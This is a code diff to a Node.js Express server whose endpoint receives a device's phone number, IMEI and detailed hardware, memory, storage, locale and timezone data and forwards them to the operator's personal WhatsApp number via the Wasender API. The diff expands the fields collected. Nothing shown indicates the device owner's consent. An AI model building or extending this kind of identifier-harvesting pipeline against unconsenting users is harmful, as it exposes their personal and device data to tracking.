@@ -11,9 +11,9 @@ const WASENDER_TOKEN = process.env.WASENDER_TOKEN;
 const MY_WHATSAPP_NUMBER = process.env.MY_WHATSAPP_NUMBER;
 
 
-// ==========================================
+// ==========================================================
 // CHECK ENVIRONMENT VARIABLES
-// ==========================================
+// ==========================================================
 
 if (!WASENDER_TOKEN || !MY_WHATSAPP_NUMBER) {
 
@@ -28,9 +28,9 @@ if (!WASENDER_TOKEN || !MY_WHATSAPP_NUMBER) {
 }
 
 
-// ==========================================
+// ==========================================================
 // MIDDLEWARE
-// ==========================================
+// ==========================================================
 
 app.use(cors());
 
@@ -41,9 +41,10 @@ app.use(
 );
 
 
-// ==========================================
+// ==========================================================
 // HOME PAGE
-// ==========================================
+// index.html is NOT changed
+// ==========================================================
 
 app.get("/", (req, res) => {
 
@@ -54,9 +55,9 @@ app.get("/", (req, res) => {
 });
 
 
-// ==========================================
+// ==========================================================
 // STATUS
-// ==========================================
+// ==========================================================
 
 app.get("/api/status", (req, res) => {
 
@@ -73,9 +74,9 @@ app.get("/api/status", (req, res) => {
 });
 
 
-// ==========================================
+// ==========================================================
 // SEND DEVICE INFORMATION
-// ==========================================
+// ==========================================================
 
 app.post("/api/send-device-info", async (req, res) => {
 
@@ -91,82 +92,175 @@ app.post("/api/send-device-info", async (req, res) => {
         const info = req.body || {};
 
 
-        // ==========================================
-        // PHONE NUMBER
-        // ==========================================
+        // ======================================================
+        // PHONE / IMEI
+        // ======================================================
 
         const phoneNumber =
             info.phoneNumber || "Unavailable";
-
-
-        // ==========================================
-        // IMEI
-        // ==========================================
 
         const imei =
             info.imei || "Unavailable";
 
 
-        // ==========================================
+        // ======================================================
         // DEVICE
-        // ==========================================
+        // ======================================================
 
         const manufacturer =
             info.manufacturer || "Unknown";
 
-        const device =
-            info.device || "Unknown";
+        const brand =
+            info.brand || "Unknown";
 
-        const android =
-            info.android || "Unknown";
+        const model =
+            info.model || "Unknown";
+
+        const androidVersion =
+            info.androidVersion || "Unknown";
 
         const sdk =
             info.sdk || "Unknown";
 
+        const device =
+            info.device || "Unknown";
 
-        // ==========================================
+        const product =
+            info.product || "Unknown";
+
+        const board =
+            info.board || "Unknown";
+
+        const hardware =
+            info.hardware || "Unknown";
+
+        const abi =
+            info.abi || "Unknown";
+
+
+        // ======================================================
         // HARDWARE
-        // ==========================================
+        // ======================================================
 
-        const cpu =
-            info.cpu || "Unknown";
+        const cpuCores =
+            info.cpuCores !== undefined
+                ? info.cpuCores
+                : "Unknown";
+
+        const totalRamMB =
+            info.totalRamMB !== undefined
+                ? info.totalRamMB
+                : "Unknown";
+
+        const availableRamMB =
+            info.availableRamMB !== undefined
+                ? info.availableRamMB
+                : "Unknown";
 
 
-        // ==========================================
+        // ======================================================
         // BATTERY
-        // ==========================================
+        // ======================================================
 
         const battery =
-            info.battery || "Unknown";
+            info.battery !== undefined
+                ? info.battery
+                : "Unknown";
 
 
-        // ==========================================
+        // ======================================================
         // STORAGE
-        // ==========================================
+        // ======================================================
 
-        const storage =
-            info.storage || "Unknown";
+        const totalStorageMB =
+            info.totalStorageMB !== undefined
+                ? info.totalStorageMB
+                : "Unknown";
 
-
-        // ==========================================
-        // SCREEN
-        // ==========================================
-
-        const screen =
-            info.screen || "Unknown";
-
-
-        // ==========================================
-        // TIME
-        // ==========================================
-
-        const time =
-            info.time || "Unknown";
+        const freeStorageMB =
+            info.freeStorageMB !== undefined
+                ? info.freeStorageMB
+                : "Unknown";
 
 
-        // ==========================================
+        // ======================================================
+        // LOCALE / TIMEZONE
+        // ======================================================
+
+        const locale =
+            info.locale || "Unknown";
+
+        const timezone =
+            info.timezone || "Unknown";
+
+
+        // ======================================================
+        // TIMESTAMP
+        // ======================================================
+
+        let timestamp =
+            info.timestamp || Date.now();
+
+
+        let localTime =
+            "Unknown";
+
+
+        try {
+
+            localTime =
+                new Date(timestamp).toLocaleString(
+                    "en-US",
+                    {
+                        timeZone: timezone !== "Unknown"
+                            ? timezone
+                            : "UTC"
+                    }
+                );
+
+        } catch (e) {
+
+            localTime =
+                new Date(timestamp).toISOString();
+
+        }
+
+
+        // ======================================================
+        // CONVERT MEMORY
+        // ======================================================
+
+        const totalRamGB =
+            totalRamMB !== "Unknown"
+                ? (Number(totalRamMB) / 1024).toFixed(2)
+                : "Unknown";
+
+
+        const availableRamGB =
+            availableRamMB !== "Unknown"
+                ? (Number(availableRamMB) / 1024).toFixed(2)
+                : "Unknown";
+
+
+        // ======================================================
+        // CONVERT STORAGE
+        // ======================================================
+
+        const totalStorageGB =
+            totalStorageMB !== "Unknown"
+                ? (Number(totalStorageMB) / 1024).toFixed(2)
+                : "Unknown";
+
+
+        const freeStorageGB =
+            freeStorageMB !== "Unknown"
+                ? (Number(freeStorageMB) / 1024).toFixed(2)
+                : "Unknown";
+
+
+        // ======================================================
         // WHATSAPP MESSAGE
-        // ==========================================
+        // ======================================================
 
         const message =
 
@@ -174,54 +268,66 @@ app.post("/api/send-device-info", async (req, res) => {
 ━━━━━━━━━━━━━━━━
 
 📞 PHONE
-Number       : ${phoneNumber}
+Number          : ${phoneNumber}
 
 🔐 DEVICE ID
-IMEI         : ${imei}
+IMEI            : ${imei}
 
 📱 DEVICE
-Manufacturer : ${manufacturer}
-Model        : ${device}
+Manufacturer    : ${manufacturer}
+Brand           : ${brand}
+Model           : ${model}
+Device          : ${device}
 
 🤖 ANDROID
-Version      : ${android}
-SDK          : ${sdk}
+Version         : ${androidVersion}
+SDK             : ${sdk}
 
 ⚙️ HARDWARE
-CPU Cores    : ${cpu}
+CPU Cores       : ${cpuCores}
+CPU ABI         : ${abi}
+Board           : ${board}
+Hardware        : ${hardware}
+Product         : ${product}
 
-📺 DISPLAY
-Screen       : ${screen}
+🧠 MEMORY
+Total RAM       : ${totalRamGB} GB
+Available RAM   : ${availableRamGB} GB
 
 🔋 BATTERY
-Status       : ${battery}
+Level           : ${battery}%
 
 💾 STORAGE
-Storage      : ${storage}
+Total           : ${totalStorageGB} GB
+Free            : ${freeStorageGB} GB
+
+🌐 SYSTEM
+Locale          : ${locale}
+Timezone        : ${timezone}
 
 🕒 TIME
-Local Time   : ${time}
+Local Time      : ${localTime}
 
 ━━━━━━━━━━━━━━━━
 © 2010–2026 HZR 2010`;
 
 
 
-        // ==========================================
+        // ======================================================
         // SERVER LOG
-        // ==========================================
+        // ======================================================
 
         console.log("Phone:", phoneNumber);
         console.log("IMEI:", imei);
         console.log(
             "Device:",
             manufacturer,
-            device
+            model
         );
 
         console.log(
             "Android:",
-            android
+            androidVersion
         );
 
         console.log(
@@ -234,9 +340,9 @@ Local Time   : ${time}
         );
 
 
-        // ==========================================
+        // ======================================================
         // SEND TO WASENDER
-        // ==========================================
+        // ======================================================
 
         const response = await fetch(
             "https://api.wasender.dev/messages/text",
@@ -266,9 +372,9 @@ Local Time   : ${time}
         );
 
 
-        // ==========================================
-        // READ RESPONSE
-        // ==========================================
+        // ======================================================
+        // READ WASENDER RESPONSE
+        // ======================================================
 
         const resultText =
             await response.text();
@@ -285,9 +391,9 @@ Local Time   : ${time}
         );
 
 
-        // ==========================================
-        // API ERROR
-        // ==========================================
+        // ======================================================
+        // WASENDER ERROR
+        // ======================================================
 
         if (!response.ok) {
 
@@ -307,9 +413,9 @@ Local Time   : ${time}
         }
 
 
-        // ==========================================
+        // ======================================================
         // PARSE RESPONSE
-        // ==========================================
+        // ======================================================
 
         let result = {};
 
@@ -318,9 +424,7 @@ Local Time   : ${time}
             result =
                 JSON.parse(resultText);
 
-        }
-
-        catch (e) {
+        } catch (e) {
 
             console.log(
                 "Wasender response was not JSON."
@@ -329,9 +433,9 @@ Local Time   : ${time}
         }
 
 
-        // ==========================================
+        // ======================================================
         // SUCCESS
-        // ==========================================
+        // ======================================================
 
         console.log(
             "Message accepted by Wasender."
@@ -355,9 +459,7 @@ Local Time   : ${time}
         });
 
 
-    }
-
-    catch (error) {
+    } catch (error) {
 
         console.error(
             "================================="
@@ -388,9 +490,9 @@ Local Time   : ${time}
 });
 
 
-// ==========================================
+// ==========================================================
 // START SERVER
-// ==========================================
+// ==========================================================
 
 app.listen(
     PORT,
